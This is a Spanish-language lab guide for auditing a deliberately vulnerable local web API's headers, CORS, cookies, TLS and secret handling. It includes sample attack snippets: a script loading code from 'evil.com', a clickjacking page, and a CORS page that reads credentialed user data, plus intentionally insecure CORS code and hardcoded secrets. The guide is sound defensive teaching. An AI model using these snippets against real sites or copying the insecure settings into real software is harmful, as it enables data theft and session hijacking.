# Lab 3.4: Auditoría de Configuraciones Seguras (60 min)

## 🎯 Objetivo

Aprender a **auditar configuraciones de seguridad** en aplicaciones web y APIs, incluyendo **Security Headers**, **CORS**, **Cookies**, **HTTPS/TLS**, y **gestión de secretos**. Estas configuraciones son críticas para prevenir ataques como XSS, clickjacking, MITM, y session hijacking.

## 📚 Conceptos Clave

### ¿Por qué las Configuraciones Importan?

Según el **OWASP Top 10 2021**, **A05: Security Misconfiguration** es una de las vulnerabilidades más comunes:

| Misconfiguration | Impacto |
|------------------|---------|
| **Missing Security Headers** | XSS, Clickjacking, MIME sniffing |
| **Permissive CORS** | Robo de datos cross-origin |
| **Insecure Cookies** | Session hijacking, XSS |
| **Weak TLS** | MITM, eavesdropping |
| **Exposed Secrets** | Acceso no autorizado total |
| **Debug Mode en Producción** | Information disclosure |

**Dato clave:** El 90% de las aplicaciones tienen al menos 1 header de seguridad faltante.

---

## 🔗 Relación con Otros Labs

| Lab Anterior | Conexión | Este Lab |
|--------------|----------|----------|
| **Lab 3.1 (API Security)** | Creamos VulnerableShopAPI → | Auditamos sus configuraciones |
| **Lab 3.3 (Pentesting Manual)** | Encontramos vulns → | Verificamos configuraciones que las causan |

---

## 📋 Prerequisitos

- ✅ VulnerableShopAPI del Lab 3.1 funcionando
- ✅ curl instalado
- ✅ Navegador con DevTools (Chrome/Firefox)
- ✅ Opcional: OpenSSL para verificar TLS

---

## 🛠️ Parte 1: Auditoría de Security Headers (15 min)

### Paso 1: Verificar Headers Actuales

```bash
# Obtener headers HTTP de la API
curl -I http://localhost:5000/api/users

# Output esperado (vulnerable):
# HTTP/1.1 200 OK
# Content-Type: application/json; charset=utf-8
# Date: Wed, 11 Dec 2025 10:00:00 GMT
# Server: Kestrel
# Transfer-Encoding: chunked
#
# ❌ FALTA: X-Content-Type-Options
# ❌ FALTA: X-Frame-Options
# ❌ FALTA: Content-Security-Policy
# ❌ FALTA: Strict-Transport-Security
# ❌ EXPUESTO: Server header (revela tecnología)
```

### Paso 2: Checklist de Security Headers

#### Header 1: Content-Security-Policy (CSP)

**Propósito:** Prevenir XSS definiendo fuentes permitidas de contenido.

```bash
# Verificar CSP
curl -I http://localhost:5000 | grep -i "Content-Security-Policy"

# ❌ Si está ausente: Vulnerable a XSS
```

**Configuración correcta:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'
```

**Test de impacto:**
```html
<!-- Abrir en navegador: http://localhost:5000 -->
<!-- Inyectar en DevTools Console: -->
<script>
  var script = document.createElement('script');
  script.src = 'https://evil.com/malicious.js';
  document.body.appendChild(script);
</script>

<!-- Sin CSP: El script se carga ✅ Vulnerable -->
<!-- Con CSP: Bloqueado por política ✅ Seguro -->
```

#### Header 2: X-Content-Type-Options

**Propósito:** Prevenir MIME sniffing attacks.

```bash
curl -I http://localhost:5000/api/users | grep -i "X-Content-Type-Options"

# ❌ Ausente: Navegador puede interpretar JSON como HTML
```

**Configuración correcta:**
```
X-Content-Type-Options: nosniff
```

**Test de impacto:**
```html
<!-- Sin X-Content-Type-Options -->
<!-- Un atacante puede hacer que el navegador interprete JSON como HTML -->
<script src="http://localhost:5000/api/users"></script>
<!-- Si el JSON contiene: {"name":"<script>alert('XSS')</script>"} -->
<!-- El navegador lo ejecutaría como script -->
```

#### Header 3: X-Frame-Options

**Propósito:** Prevenir clickjacking.

```bash
curl -I http://localhost:5000 | grep -i "X-Frame-Options"

# ❌ Ausente: Página puede ser embebida en iframe
```

**Configuración correcta:**
```
X-Frame-Options: DENY
# o
X-Frame-Options: SAMEORIGIN
```

**Test de impacto:**
```html
<!-- Crear archivo test_clickjacking.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking Test</title>
    <style>
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.1; /* Casi invisible */
            z-index: 2;
        }
        button {
            position: absolute;
            top: 50%;
            left: 50%;
            z-index: 1;
        }
    </style>
</head>
<body>
    <button>Click aquí para ganar $1000!</button>
    <iframe src="http://localhost:5000"></iframe>
</body>
</html>

<!-- Sin X-Frame-Options: iframe se carga ✅ Vulnerable -->
<!-- Con X-Frame-Options: Navegador bloquea iframe ✅ Seguro -->
```

#### Header 4: Strict-Transport-Security (HSTS)

**Propósito:** Forzar HTTPS y prevenir downgrade attacks.

```bash
curl -I https://localhost:5001 | grep -i "Strict-Transport-Security"

# ❌ Ausente: Conexión puede ser downgraded a HTTP
```

**Configuración correcta:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

#### Header 5: Referrer-Policy

**Propósito:** Controlar qué información se envía en el header Referer.

```bash
curl -I http://localhost:5000 | grep -i "Referrer-Policy"

# ❌ Ausente: URLs completas con datos sensibles pueden filtrarse
```

**Configuración correcta:**
```
Referrer-Policy: no-referrer
# o
Referrer-Policy: strict-origin-when-cross-origin
```

#### Header 6: Permissions-Policy (antes Feature-Policy)

**Propósito:** Deshabilitar APIs del navegador no utilizadas.

```bash
curl -I http://localhost:5000 | grep -i "Permissions-Policy"
```

**Configuración correcta:**
```
Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
```

### Paso 3: Usar Herramienta Online

**SecurityHeaders.com:**
```bash
# Nota: Solo funciona con sitios públicos, no localhost

# Para testing local, usar curl + checklist manual
```

**Crear script de auditoría:**
```bash
#!/bin/bash

URL="http://localhost:5000"

echo "Security Headers Audit"
echo "======================"
echo "URL: $URL"
echo ""

HEADERS=$(curl -sI "$URL")

# Check CSP
if echo "$HEADERS" | grep -qi "Content-Security-Policy"; then
    echo "✅ Content-Security-Policy: PRESENT"
else
    echo "❌ Content-Security-Policy: MISSING"
fi

# Check X-Content-Type-Options
if echo "$HEADERS" | grep -qi "X-Content-Type-Options"; then
    echo "✅ X-Content-Type-Options: PRESENT"
else
    echo "❌ X-Content-Type-Options: MISSING"
fi

# Check X-Frame-Options
if echo "$HEADERS" | grep -qi "X-Frame-Options"; then
    echo "✅ X-Frame-Options: PRESENT"
else
    echo "❌ X-Frame-Options: MISSING"
fi

# Check HSTS
if echo "$HEADERS" | grep -qi "Strict-Transport-Security"; then
    echo "✅ Strict-Transport-Security: PRESENT"
else
    echo "❌ Strict-Transport-Security: MISSING"
fi

# Check Referrer-Policy
if echo "$HEADERS" | grep -qi "Referrer-Policy"; then
    echo "✅ Referrer-Policy: PRESENT"
else
    echo "❌ Referrer-Policy: MISSING"
fi

# Check Server header (should be removed)
if echo "$HEADERS" | grep -qi "Server:"; then
    echo "⚠️  Server header: EXPOSED (should be removed)"
else
    echo "✅ Server header: REMOVED"
fi
```

---

## 🌐 Parte 2: Auditoría de CORS (15 min)

### Paso 1: Verificar Configuración CORS

```bash
# Hacer preflight request (OPTIONS)
curl -X OPTIONS http://localhost:5000/api/users \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: GET" \
  -i

# Verificar headers de respuesta:
# Access-Control-Allow-Origin: ?
# Access-Control-Allow-Methods: ?
# Access-Control-Allow-Headers: ?
# Access-Control-Allow-Credentials: ?
```

### Paso 2: Configuraciones CORS Inseguras

#### Configuración 1: Wildcard con Credentials

```csharp
// ❌ INSEGURO
app.UseCors(policy => policy
    .AllowAnyOrigin()  // Permite cualquier origen
    .AllowCredentials()  // Permite cookies/auth
);

// Respuesta HTTP:
// Access-Control-Allow-Origin: *
// Access-Control-Allow-Credentials: true
// ❌ VULNERABILIDAD: Cualquier sitio puede hacer requests autenticados
```

**Test de explotación:**
```html
<!-- Crear archivo evil_cors.html -->
<!DOCTYPE html>
<html>
<head>
    <title>CORS Attack</title>
</head>
<body>
    <h1>CORS Vulnerability Test</h1>
    <div id="result"></div>

    <script>
        fetch('http://localhost:5000/api/users', {
            credentials: 'include'  // Incluir cookies
        })
        .then(response => response.json())
        .then(data => {
            document.getElementById('result').innerHTML =
                '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
            console.log('✅ VULNERABLE: Datos obtenidos desde evil.com');
        })
        .catch(error => {
            console.log('✅ SEGURO: CORS bloqueó la request');
        });
    </script>
</body>
</html>

<!-- Abrir en navegador desde file:// o servidor local diferente -->
```

#### Configuración 2: Reflect Origin sin Validación

```csharp
// ❌ INSEGURO - Refleja cualquier Origin
app.UseCors(policy => policy
    .SetIsOriginAllowed(origin => true)  // Acepta cualquier origen
    .AllowCredentials()
);

// Respuesta HTTP:
// Access-Control-Allow-Origin: https://evil.com (reflejado)
// Access-Control-Allow-Credentials: true
// ❌ VULNERABILIDAD: Igual de peligroso que wildcard
```

### Paso 3: Configuración CORS Segura

```csharp
// ✅ SEGURO
var allowedOrigins = new[] {
    "https://app.mycompany.com",
    "https://admin.mycompany.com"
};

app.UseCors(policy => policy
    .WithOrigins(allowedOrigins)  // Solo orígenes específicos
    .WithMethods("GET", "POST", "PUT", "DELETE")  // Métodos específicos
    .WithHeaders("Authorization", "Content-Type")  // Headers específicos
    .AllowCredentials()  // OK con orígenes específicos
);
```

**Checklist CORS:**
```bash
# 1. Verificar que NO use wildcard (*) con credentials
curl -X OPTIONS http://localhost:5000/api/users \
  -H "Origin: https://evil.com" \
  -i | grep -i "Access-Control"

# 2. Verificar que valide orígenes
# Probar con múltiples orígenes y confirmar que solo los permitidos respondan

# 3. Verificar métodos permitidos
curl -X OPTIONS http://localhost:5000/api/users \
  -H "Origin: https://app.mycompany.com" \
  -H "Access-Control-Request-Method: DELETE" \
  -i
```

---

## 🍪 Parte 3: Auditoría de Cookies (10 min)

### Paso 1: Inspeccionar Cookies

```bash
# Hacer login y capturar cookies
curl -c cookies.txt -X POST http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@shop.com","password":"Admin123!"}'

# Ver cookies guardadas
cat cookies.txt

# Verificar flags de seguridad
curl -i http://localhost:5000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@shop.com","password":"Admin123!"}' \
  | grep -i "Set-Cookie"

# Output esperado:
# Set-Cookie: sessionId=abc123; Path=/
# ❌ FALTA: HttpOnly
# ❌ FALTA: Secure
# ❌ FALTA: SameSite
```

### Paso 2: Cookie Flags de Seguridad

#### Flag 1: HttpOnly

**Propósito:** Prevenir acceso a cookies vía JavaScript (XSS).

```bash
# ❌ Cookie SIN HttpOnly
Set-Cookie: sessionId=abc123; Path=/

# JavaScript puede robar la cookie:
document.cookie  // "sessionId=abc123"

# ✅ Cookie CON HttpOnly
Set-Cookie: sessionId=abc123; Path=/; HttpOnly

# JavaScript NO puede acceder:
document.cookie  // "" (vacío)
```

#### Flag 2: Secure

**Propósito:** Solo transmitir cookie vía HTTPS.

```bash
# ❌ Cookie SIN Secure
Set-Cookie: sessionId=abc123; Path=/
# Cookie se envía por HTTP → Vulnerable a MITM

# ✅ Cookie CON Secure
Set-Cookie: sessionId=abc123; Path=/; Secure
# Cookie solo se envía por HTTPS
```

#### Flag 3: SameSite

**Propósito:** Prevenir CSRF attacks.

```bash
# ❌ Cookie SIN SameSite
Set-Cookie: sessionId=abc123; Path=/
# Vulnerable a CSRF desde otros sitios

# ✅ Cookie CON SameSite
Set-Cookie: sessionId=abc123; Path=/; SameSite=Strict
# Valores:
# - Strict: No se envía en requests cross-site
# - Lax: Solo GET cross-site (default moderno)
# - None: Se envía siempre (requiere Secure)
```

### Paso 3: Configuración Segura de Cookies

```csharp
// ✅ SEGURO - Configurar cookies en ASP.NET Core
services.ConfigureApplicationCookie(options =>
{
    options.Cookie.HttpOnly = true;
    options.Cookie.SecurePolicy = CookieSecurePolicy.Always;  // Requiere HTTPS
    options.Cookie.SameSite = SameSiteMode.Strict;
    options.Cookie.Name = "__Host-SessionId";  // Prefijo __Host- obliga Secure+Path=/
    options.ExpireTimeSpan = TimeSpan.FromHours(1);  // Expiración
    options.SlidingExpiration = true;
});
```

**DevTools Inspection:**
```bash
# 1. Abrir navegador → DevTools → Application tab
# 2. Cookies → http://localhost:5000
# 3. Verificar columnas:
#    - HttpOnly: ✅
#    - Secure: ✅
#    - SameSite: Strict
#    - Expires: [fecha razonable]
```

---

## 🔐 Parte 4: Auditoría de TLS/HTTPS (10 min)

### Paso 1: Verificar Certificado

```bash
# Verificar certificado SSL/TLS
openssl s_client -connect localhost:5001 -servername localhost < /dev/null 2>/dev/null | openssl x509 -text

# Verificar:
# - Issuer: CN=[emisor]
# - Validity: Not Before / Not After (no expirado)
# - Subject Alternative Name: DNS:localhost
```

### Paso 2: Verificar Protocolo TLS

```bash
# Test TLS 1.2 (mínimo recomendado)
openssl s_client -connect localhost:5001 -tls1_2 < /dev/null

# Test TLS 1.0 (debe fallar)
openssl s_client -connect localhost:5001 -tls1 < /dev/null
# ✅ Si falla: TLS 1.0 deshabilitado correctamente

# Test TLS 1.1 (debe fallar)
openssl s_client -connect localhost:5001 -tls1_1 < /dev/null
# ✅ Si falla: TLS 1.1 deshabilitado correctamente
```

### Paso 3: Verificar Cipher Suites

```bash
# Listar cipher suites soportados
nmap --script ssl-enum-ciphers -p 5001 localhost

# Buscar cipher suites débiles:
# ❌ WEAK: RC4, DES, MD5, EXPORT
# ✅ STRONG: AES-GCM, ChaCha20, ECDHE

# Herramienta online (para sitios públicos):
# https://www.ssllabs.com/ssltest/
```

### Paso 4: Verificar Redirección HTTP → HTTPS

```bash
# Probar acceso HTTP
curl -I http://localhost:5000

# ✅ Debe redirigir a HTTPS (HTTP 301/302)
# HTTP/1.1 301 Moved Permanently
# Location: https://localhost:5001/

# ❌ Si devuelve 200: No está forzando HTTPS
```

**Configuración en ASP.NET Core:**
```csharp
// Program.cs
app.UseHttpsRedirection();  // Redirigir HTTP → HTTPS

app.UseHsts();  // Agregar HSTS header en HTTPS
```

---

## 🔑 Parte 5: Auditoría de Secretos (10 min)

### Paso 1: Buscar Secretos en Código

```bash
# Buscar API keys
grep -r "api[_-]key" --include="*.cs" --include="*.json" --include="*.config"

# Buscar passwords hardcodeados
grep -r "password\s*=\s*['\"]" --include="*.cs"

# Buscar connection strings
grep -r "Server=\|Database=\|Password=" --include="*.json" --include="*.config"

# Buscar tokens JWT secrets
grep -r "secret\s*=\s*['\"]" --include="*.cs"
```

**Ejemplo de secreto expuesto:**
```csharp
// ❌ INSEGURO - appsettings.json commiteado en Git
{
  "Jwt": {
    "Key": "my-super-secret-key-12345",  // ❌ EXPUESTO
    "Issuer": "VulnerableShop"
  },
  "ConnectionStrings": {
    "DefaultConnection": "Server=localhost;Database=Shop;User=sa;Password=MyPassword123!"  // ❌ EXPUESTO
  }
}
```

### Paso 2: Verificar .gitignore

```bash
cat .gitignore | grep -E "appsettings|secrets|env"

# Debe incluir:
# appsettings.Development.json
# appsettings.Production.json
# secrets.json
# .env
# *.pfx
# *.key
```

### Paso 3: Usar User Secrets (Desarrollo)

```bash
# Inicializar user secrets
dotnet user-secrets init --project VulnerableShopAPI

# Agregar secret
dotnet user-secrets set "Jwt:Key" "my-dev-secret-key" --project VulnerableShopAPI

# Listar secrets
dotnet user-secrets list --project VulnerableShopAPI
```

**Acceder en código:**
```csharp
// ✅ SEGURO - Leer desde User Secrets o Environment Variables
var jwtKey = builder.Configuration["Jwt:Key"];  // Lee de secrets o env vars
```

### Paso 4: Usar Azure Key Vault (Producción)

```csharp
// ✅ SEGURO - Configurar Azure Key Vault
builder.Configuration.AddAzureKeyVault(
    new Uri($"https://{keyVaultName}.vault.azure.net/"),
    new DefaultAzureCredential()
);

// Acceder igual que antes
var jwtKey = builder.Configuration["Jwt:Key"];  // Lee desde Key Vault
```

---

## 📦 Entregables del Laboratorio

### Archivos a Entregar:

1. ✅ **Checklist de Auditoría Completado** (`security_audit_checklist.md`)
   ```markdown
   # Security Configuration Audit Checklist

   ## Security Headers
   - [ ] Content-Security-Policy: ❌ Missing
   - [ ] X-Content-Type-Options: ❌ Missing
   - [ ] X-Frame-Options: ❌ Missing
   - [ ] Strict-Transport-Security: ❌ Missing
   - [ ] Referrer-Policy: ❌ Missing
   - [ ] Permissions-Policy: ❌ Missing
   - [ ] Server header: ⚠️ Exposed

   ## CORS
   - [ ] Wildcard with credentials: ❌ Vulnerable
   - [ ] Origin validation: ❌ Not implemented
   - [ ] Allowed methods: ⚠️ Too permissive

   ## Cookies
   - [ ] HttpOnly flag: ❌ Missing
   - [ ] Secure flag: ❌ Missing
   - [ ] SameSite flag: ❌ Missing
   - [ ] Expiration: ⚠️ No expiration

   ## TLS/HTTPS
   - [ ] TLS 1.2+: ✅ Supported
   - [ ] TLS 1.0/1.1 disabled: ❌ Not disabled
   - [ ] Strong cipher suites: ⚠️ Weak ciphers enabled
   - [ ] HTTP → HTTPS redirect: ❌ Not configured
   - [ ] HSTS: ❌ Missing

   ## Secrets Management
   - [ ] No hardcoded secrets: ❌ Found in appsettings.json
   - [ ] .gitignore configured: ✅ Configured
   - [ ] User Secrets (dev): ❌ Not used
   - [ ] Key Vault (prod): ❌ Not implemented

   **Overall Score: 2/25 (8%) - CRITICAL**
   ```

2. ✅ **Reporte de Hallazgos** (`configuration_findings.md`)
   - Cada misconfiguration documentada
   - Riesgo e impacto
   - Pasos de remediación

3. ✅ **Código Corregido** (carpeta `SecureShopAPI-Fixed/`)
   - Middleware de security headers implementado
   - CORS configurado correctamente
   - Cookies con flags seguros
   - Secrets movidos a User Secrets

4. ✅ **Scripts de Auditoría** (carpeta `scripts/`)
   - `audit_headers.sh`
   - `audit_cors.sh`
   - `audit_cookies.sh`
   - `audit_secrets.sh`

---

## ✅ Checklist de Validación

Antes de entregar, verifica:

- [ ] Checklist de auditoría completo con 25 items verificados
- [ ] Mínimo 10 misconfigurations identificadas
- [ ] Reporte con descripción → riesgo → remediación para cada una
- [ ] Código corregido que implementa todas las mejoras
- [ ] Scripts de auditoría funcionales
- [ ] Evidencia de testing (screenshots o output de curl)
- [ ] Comparación antes/después de la corrección

---

## 🔗 Mapeo a Estándares de Seguridad

### OWASP Top 10 2021

| Categoría | Aplicación en este Lab |
|-----------|----------------------|
| **A01: Broken Access Control** | CORS misconfiguration permite acceso no autorizado |
| **A05: Security Misconfiguration** | Headers faltantes, cookies inseguras, secrets expuestos |
| **A07: Identification and Authentication Failures** | Cookies sin HttpOnly/Secure, JWT secrets hardcodeados |

### OWASP API Security Top 10 2023

| Categoría | Aplicación |
|-----------|------------|
| **API2: Broken Authentication** | Cookies inseguras, JWT secrets débiles |
| **API7: Server Side Request Forgery** | CORS permisivo permite SSRF desde otros dominios |
| **API8: Security Misconfiguration** | Headers faltantes, TLS débil |

### ISO/IEC 27002:2022

| Control | Nombre | Aplicación |
|---------|--------|------------|
| **8.9** | Configuration management | Auditoría de todas las configuraciones de seguridad |
| **8.24** | Use of cryptography | Verificación de TLS/HTTPS configuración |
| **8.28** | Secure coding | Implementación de security headers y cookies seguras |

### CWE

| Configuración | CWE |
|---------------|-----|
| **Missing Security Headers** | CWE-693: Protection Mechanism Failure |
| **CORS Misconfiguration** | CWE-346: Origin Validation Error |
| **Insecure Cookies** | CWE-614: Sensitive Cookie Without 'HttpOnly' Flag |
| **Weak TLS** | CWE-327: Use of a Broken or Risky Cryptographic Algorithm |
| **Hardcoded Secrets** | CWE-798: Use of Hard-coded Credentials |

---

## 🏁 Conclusión

En este laboratorio aprendiste a:

✅ Auditar Security Headers críticos (CSP, X-Frame-Options, HSTS, etc.)
✅ Verificar configuraciones CORS seguras
✅ Inspeccionar cookies y sus flags de seguridad
✅ Validar configuración TLS/HTTPS
✅ Detectar secretos hardcodeados y usar User Secrets/Key Vault
✅ Documentar misconfigurations profesionalmente
✅ Implementar correcciones siguiendo best practices

**Dato clave:** Security misconfiguration es la vulnerabilidad más común pero también la más fácil de prevenir con auditorías regulares.

---

**Tiempo total**: 60 minutos
**Dificultad**: ⭐⭐⭐ Intermedia
**Prerequisitos**: Lab 3.1 (VulnerableShopAPI)

**Próximo paso**: README.md del Día 3 con agenda completa y flujo del día.
